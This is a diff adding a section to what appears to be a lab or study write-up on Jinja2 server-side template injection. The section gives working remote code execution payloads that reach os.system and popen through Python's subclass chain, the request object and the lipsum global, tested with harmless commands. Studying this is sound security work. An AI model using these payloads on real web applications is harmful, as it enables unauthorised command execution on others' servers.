@@ -958,3 +958,31 @@ then we can print out the number and the method names using a new payload:
 
 in this list we can find `catch_warnings` at index 214
 
+now we have everything we need to construct an RCE payload like: 
+
+```python
+{{''.__class__.__mro__[1].__subclasses__()[214]()._module.__builtins__['__import__']('os').system("touch /tmp/test1") }}
+```
+
+![](Images/Pasted%20image%2020240214181228.png)
+
+the app returned 0 which signals that the command we entered executed without errors 
+
+then we can see if `test1` was actually created with another payload: 
+
+```python
+{{''.__class__.__mro__[1].__subclasses__()[214]()._module.__builtins__['__import__']('os').popen('ls /tmp').read()}}
+```
+
+![](Images/Pasted%20image%2020240214181424.png)
+
+there are also some specific functions that facilitate the exploitation of jinja2 SSTI vulnerabilities, like `request` and `lipsum`
+
+```python
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+```
+
+```python
+{{lipsum.__globals__.os.popen('id').read()}}
+```
+
